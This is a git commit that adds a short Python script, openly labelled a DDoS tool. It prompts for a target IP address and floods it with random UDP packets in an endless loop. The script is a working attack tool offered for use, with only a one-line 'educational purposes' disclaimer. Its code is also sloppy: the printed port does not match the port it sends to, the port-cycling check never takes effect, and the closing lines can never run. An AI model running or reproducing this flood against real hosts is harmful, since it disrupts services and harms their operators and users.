16ae9ec79c8a759ab40c3f704eb2bac0a69ad11d
copy & execute <145934673+copy-and-execute@users.noreply.github.com>
2023-09-27 18:07:02 +0200

    Create main.py

---
+++ main.py
@@ -0,0 +1,28 @@
+import os
+import time
+import socket
+import random
+
+print()
+print('    | DDoS Tool by → copy-and-execute (github.com/copy-and-execute/)')
+print('    | → This tool is only for educational purposes. Do not use this for illegal purposes.')
+print()
+mydate = time.strftime('%Y-%m-%d')
+mytime = time.strftime('%H-%M')
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+ip = input("    | Target IP → ")
+print("    | Attacking on →", ip, "...")
+
+time.sleep(2.5)
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, 1))
+    sent = sent + 1
+    port = 80
+    print("    | Sent Packet → %s through %s:%s" % (sent, ip, port))
+    if port == 65534:
+        port = 1
+
+os.system("cls")
+input("Press Enter to exit...")
